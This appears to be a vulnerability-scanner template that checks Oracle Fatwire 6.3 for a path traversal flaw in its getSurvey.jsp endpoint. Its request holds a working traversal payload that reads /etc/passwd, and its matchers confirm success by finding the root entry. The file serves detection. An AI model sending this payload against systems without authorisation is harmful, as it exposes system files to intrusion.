id: "oracle-fatwire-lfi"
name: "Oracle Fatwire 6.3 - Path Traversal"
severity: "high"
description: "Oracle Fatwire 6.3 suffers from a path traversal vulnerability in the getSurvey.jsp endpoint."
tech:
  - "tomcat"
  - "java"
tags:
  - "lfi"
  - "oracle"
  - "fatwire"
  - "edb"
  - "vuln"
cwe: "CWE-22"
reference: "https://www.exploit-db.com/exploits/50167"
spaExclusion: true
request:
  method: "GET"
  path: "/cs/career/getSurvey.jsp?fn=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "regex"
    part: "body"
    regex:
      - "root:.*:0:0:"
  - type: "status"
    status:
      - 200
